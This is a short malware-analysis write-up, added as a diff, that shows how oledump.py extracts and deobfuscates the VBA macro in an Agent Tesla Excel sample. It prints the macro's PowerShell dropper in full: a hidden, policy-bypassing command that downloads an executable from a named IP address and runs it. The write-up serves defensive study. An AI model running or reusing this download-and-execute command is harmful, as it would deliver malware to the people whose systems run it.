@@ -1,0 +1,56 @@
+oledump.py is a Python tool for analyzing OLE2 files (e.g., .doc, .xlsm). It extracts and inspects embedded content, including macros.
+Commands Used
+1. Analyzing the File
+
+oledump.py agenttesla.xlsm
+
+    Output: Lists streams and identifies macros (marked with M).
+
+2. Selecting a Data Stream
+
+oledump.py agenttesla.xlsm -s 4
+
+    -s 4: Selects the 4th stream (VBA/ThisWorkbook), where the macro resides.
+
+3. Decompressing VBA Code
+
+oledump.py agenttesla.xlsm -s 4 --vbadecompress
+
+    --vbadecompress: Decompresses the VBA script for readability.
+
+Key Analysis
+
+    Embedded Macro Behavior:
+        Runs PowerShell commands.
+        Downloads an executable (Doc-3737122pdf.exe) from http://193.203.203.67/rt/.
+        Saves the file as a .exe in $TempFile.
+        Executes the downloaded file with Start-Process.
+
+Extracting the Script
+
+    Inspecting Script Output
+        Example script snippet:
+
+        powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru; Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile; Start-Process $TempFile;
+
+    Decoding Script in CyberChef
+        Use Find/Replace to remove obfuscation:
+            Replace * and ^ with empty strings.
+        Result: Clear and executable PowerShell script.
+
+Breakdown of the Malicious PowerShell Command
+
+    -WindowStyle hidden: Runs PowerShell invisibly.
+    -executionpolicy bypass: Overrides script execution restrictions.
+    Invoke-WebRequest:
+        Downloads Doc-3737122pdf.exe.
+        Saves it to $TempFile.
+    Start-Process: Executes the downloaded file.
+
+Summary of Behavior
+
+When opened, the macro executes a hidden PowerShell command that:
+
+    Bypasses security.
+    Downloads malware (Doc-3737122pdf.exe).
+    Executes it to potentially compromise the system.
